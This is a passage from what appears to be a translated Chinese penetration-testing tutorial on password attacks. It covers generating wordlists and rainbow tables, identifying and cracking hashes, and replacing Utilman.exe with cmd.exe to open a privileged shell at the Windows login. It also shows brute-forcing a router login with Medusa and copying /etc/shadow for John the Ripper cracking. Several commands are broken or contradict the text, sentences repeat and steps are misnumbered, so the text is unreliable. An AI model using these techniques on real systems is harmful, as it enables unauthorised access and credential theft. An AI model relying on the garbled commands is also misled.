  \n`rsmangler` 是一个基于列表关键词生成字典的工具。使用该工具根据用户收集的信息常用的密码构造规则构建字典。\n\n其中，`rsmangler` 工具的语法格式如下：\n\
  \n```bash\nrsmangler -f wordlist.txt -o new_passwords.txt\n```\n\n上述语法中的选项及其含义如下：\n\
  \n- `-f`, `--file`：指定输入文件，即用户收集的密码词。\n- `-o`, `--output`：指定生成的字典文件名。\n\n\n\n\n使用\
  \ `rsmangler` 工具生成字典。\n\n具体步骤如下：\n\n1) 创建一个文件来保存收集到的密码单词。这里将创建一个名为 `test` 的文件，只需保存两个单词即可生成新字典。\n\
  \n```bash\nroot@exampleserver:～# vi test password\n```\n\n(2) 使用 `rsmangler` 工具生成字典并保存到\
  \ `pass.txt`。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～# rsmangler -f test -o\
  \ pass.txt\n```\n\n执行上述命令后，将不会输出任何信息。此时，用户可以使用 `cat` 命令查看生成的字典文件，如下：\n\n```bash\n\
  root @exampleserver: ~ # cat pass.txt\n```\n\n你可以从输出信息中看到生成的密码字典。由于空间限制，仅列出了部分密码。\n\
  \n3) 使用 `rtgen` 工具\n\n`rtgen` 工具用于生成彩虹表（rainbow tables）。彩虹表是所有可能的字母组合和预计算哈希值的巨大集合。其中，生成的彩虹表包含多种算法，如\
  \ `LM`、`NTLM`、`MD5`、`SHA1` 和 `SHA256`。\n\n然后，使用彩虹表可以快速破解各种密码。下面将介绍使用 `rtegn` 工具生成彩虹表的方法。\n\
  \n语法格式如下：\n\n```bash\nrtgen hash_algorithm charset plaintext_len_min plaintext_len_max\
  \ table\n```\n\n上述语法中参数的含义如下：\n\n- `Hash_algorithm`: 指定所使用的哈希算法。其中，可以指定的值包括 `lm`、`ntlm`、`md5`、`sha1`\
  \ 和 `sha256`。\n- `Charset`: 指定字符集。其中，`rtgen` 工具提供的默认字符集文件为 `/usr/share/rainbowcrack/charset.txt`，如下：\n\
  \n```bash\nroot @ exampleserver: /usr/share/rainbowcrack\n# cat charset.txt\n```\n\
  \n上述输出信息显示了 `rtgen` 工具默认提供的所有字符集。\n\n其中，指定的密码最小长度为 4，最大长度为 8。\n\n执行命令如下：\n\n```bash\n\
  root@exampleserver:～# rtgen md5 loweralpha 4 8 010001000 0\n```\n\n看到上述输出信息，意味着已成功生成了基于\
  \ `MD5` 的彩虹表，文件名为 `md5_loweralpha#4-6_0_1000x1000_0.rt`。\n\n其中，彩虹表默认存在 `/usr/share/rainbowcrack`\
  \ 目录下：\n\n```bash\nroot@exampleserver:～# cd /usr/share/rainbowcrack/\n```\n\n从输出信息中，我们可以看到生成的彩虹表文件为\
  \ `md5_loweralpha#4-8_0_1000x1000_0.rt`。\n\n为了方便使用生成的彩虹表，可以使用 `rtsort` 命令对其进行排序。\n\
  \n执行命令如下：\n\n```bash\nroot@exampleserver:/usr/share/rainbowcrack# rtsort\n```\n\n\
  执行上述命令后，不会输出任何信息。接下来，你可以使用彩虹表进行密码破解。\n\n## 第 43 章：破解哈希密码\n\n![](img/image_rsrc4A0.jpg)\n\
  \n### 破解哈希密码\n\n为了避免信息泄露造成的危害，在实际应用中，软件和系统会对密码进行加密然后保存。常见的加密方法是各种哈希算法。这类算法可以将不同长度的密码加密为固定长度的字符串。由于加密字符串长度固定且无法直接反向破解，因此具有很高的安全性，因此被广泛使用。下面将介绍破解哈希密码的方法。\n\
  \n### 识别哈希加密方法\n\n哈希加密是一种算法，包含许多特定的算法。当渗透测试人员破解哈希密码时，如果他确定了哈希密码的加密方法，就可以选择针对性的工具和方法进行破解，从而节省大量时间并提高破解效率。下节描述了如何使用\
  \ `hashid` 工具识别哈希加密方法。\n\n使用下方的 `hashid` 工具识别哈希值 `6bcec2ba2597f089189735afeaa300d4`\
  \ 的加密方法。\n\n执行命令如下：\n\n```bash\nroot@exampleserver: hashed tool MD5\n```\n\n上述输出信息显示了可能的哈希密码方法。其中，前面显示的哈希类型更有可能。可以猜测密码的哈希类型为\
  \ `MD2` 或 `MD5`。\n\n### 破解 LM 哈希密码\n\nLM（LAN Manager）哈希是 Windows 操作系统中使用最早的密码哈希算法之一。下面将介绍使用\
  \ `findmyhash` 工具破解 LM 哈希密码的方法。\n\n使用 `findmyhash` 工具破解密码的语法格式如下：\n\n```bash\nfindmyhash\
  \ OPTIONS\n```\n\n在上述语法中，参数 `algorithm` 表示要破解的密码算法类型。支持的算法包括 `MD4`、`MD5`、`SHA1`、`SHA224`、`SHA256`、`SHA384`、`SHA512`、`RMD160`、`GOST`、`WHIRLPOOL`、`LM`、`NTLM`、`MYSQL`、`CISCO7`、`JUNIPER`、`LDAP_MD5`\
  \ 和 `LDAp_SHA1`。`OPTIONS` 表示可用选项。\n\n其中常用的选项及其含义如下：\n\n- `-H <hash_value>`: 指定哈希值。\n\
  - `-F`: 指定列表。\n- `-G`: 如果哈希密码无法破解，将使用 Google 搜索。\n- `-h`: 此选项只能与 `-h` 一起使用（注：此处原文可能可能有误，此处按原意翻译）。\n\
  \n```bash\nroot@exampleserver:～# findmyhash MD5-h\n```\n\n\n\n\n4) 此界面显示了 Linux\
  \ Live 系统的文件列表。此时，选择左列中的 `Other Locations`（其他位置）命令来查看其他硬盘文件。\n\n5) 此界面显示了计算机中的所有磁盘分区。根据显示的分区大小，找到\
  \ Windows 系统的分区。在本例中，Windows 系统的分区是 `322GB Volume`。因此，打开硬盘分区将显示 Windows 系统的文件列表。\n\
  \n6) 在此界面中，依次进入 `Windows|System32` 文件夹，将显示显示的内容。\n\n7) 在文件夹中找到 `Utilman.exe` 文件并将该文件重命名为\
  \ `Utilman.old`。然后复制目录下的 `cmd.exe` 文件作为副本，并将其文件名修改为 `Utilman.exe`。接下来，关闭 Kali Linux\
  \ Live 模式并启动 Windows 系统。在登录界面按下 `Wins+U` 组合键，将显示所所示的界面。\n\n8) 从此界面，你可以看到打开了一个命令提示符窗口。在这个窗口中，你可以执行各种终端命令。例如，使用\
  \ `whoami` 命令查看用户信息。\n\n9) 从输出信息可以看出，当前用户具有最高权限。此时，可以执行任何操作。\n\n# 路由器密码破解\n\n路由器是网络的核心设备。一旦控制了路由器，就可以对连接到路由器的主机进行各种数据嗅探和欺骗攻击。大多数路由器使用用户名/密码认证方法。每个路由器的管理界面都有一个初始用户名和密码。由于某些管理员用户的错误，可能会使用初始密码或弱密码。本节将介绍破解路由器密码的常用方法。\n\
  \n## 路由器密码\n\n大多数路由器都有初始用户名和密码。为了方便用户实现路由器密码破解，下面列出了常见的路由器初始用户名和密码。\n\n### 使用 Medusa\
  \ 工具\n\nMedusa 是一款开源的暴力破解密码工具，它可以破解多种在线线密码，如 FTP、HTTP、IMAP 和 MYSQL。其中，路由器的管理界面基于\
  \ HTTP 协议，因此用户可以使用 Medusa 工具实现密码破解。下面将介绍如何使用 Medusa 工具破解路由器密码。\n\n使用 Medusa 暴力破解路由器密码的语法格式如下：\n\
  \n```\nmedusa -h [IP] -U [user file] -P [pass file] -M http -e ns\n```\n\n暴力破解 TP-Linux\
  \ 路由器的登录用户名和密码。\n\n执行命令如下：\n\n```\nroot@exampleserver:～# medusa -h 192.168.1.1-u\
  \ admin -P passords.txt\nACCOUNT FOUND: [http] Host: 192.168.1.1 User: admin Password:\
  \ daxueba [SUCCESS]\n```\n\n上面的输出信息显示了破解路由器密码的过程。从显示的结果中，可以看到路由器的用户名和密码已成功破解。其中，用户名为\
  \ `admin`，密码为 `daxueba`。\n\n# 破解 Linux 密码\n\n在 Linux 中，许多操作需要 root 用户 `root` 执行。如果获取\
  \ Linux 远程会话的用户没有权限且无法提升权限，则会话是无用的。此时，用户可以破解 Linux 系统的用户密码并登录目标系统。下面将介绍破解 Linux\
  \ 用户密码的方法。\n\nLinux 系统将加密的密码哈希保存在名为 `shadow` 的文件中，默认保存在 `/etc/shadow` 中。只要破解了该文件就可以查看用户的原始密码。但在破解\
  \ `/etc/shadow` 密码之前，还需要 `/etc/passwd` 文件。该文件保存了用户的基本信息，如用户名、家目录和登录 Shell。破解 Linux\
  \ 用户密码需要结合 `/etc/shadow` 和 `/etc/passwd` 文件。该文件保存了用户的基本信息，如用户名、家目录和登录 Shell。破解 Linux\
  \ 用户密码需要结合 `/etc/shadow` 和 `/etc/passwd` 文件。\n\n1) 为了方便输入，将获取的密码文件复制到 `/root`。\n\
  \n执行命令：\n\n```\nroot@exampleserver:～# cp /etc/passwd /etc/shadow /root\n```\n\n\
  执行上述命令后，`passwd` 和 `shadow` 文件位于 `/root` 目录。\n\n2) 使用 `unshadow` 命令提取。\n\n执行命令如下：\n\
  \n```\nroot@exampleserver:～# unshadow shadow> cracked\n```\n\n执行上述命令意味着 `passwd`\
  \ 和 `shadow` 文件已提取并保存在 `cracked` 目录。\n\n3) 使用 `john` 工具破解密码。\n\n执行命令如下：\n\n```\n\
  root@exampleserver:～# john --wordlist=/usr/share/john/password.lst\n```\n\n警告：检测到哈希类型为\
  \ \"sha512crypt\"，但也识别为 \"crypt\" 使用 `--show` 选项显示所有密码\n\n注意：上述命令中的 `--wordlist`\
  \ 选项用于指定破解密码的字典。从输出信息可以看出，当前系统 root 用户的密码为 `daxueba`。此时，用户也可以使用 `--show` 选项查看 `passwd`\
  \ 中第二个字段的信息。\n\n执行命令如下：\n\n```\nroot@exampleserver:～# john --show cracked\n```\n\
  \n从输出信息可以看出，`passwd` 中 root 用户的第二个字段已从原始密码占位符变为真实密码。{结束}\n\n提示：使用 John the Ripper\
  \ 工具破解 Linux 用户密码时，必须在该机器上操作。此外，`/etc/shadow` 和 `/etc/passwd` 文件必须具有读取权限。\n\n##\
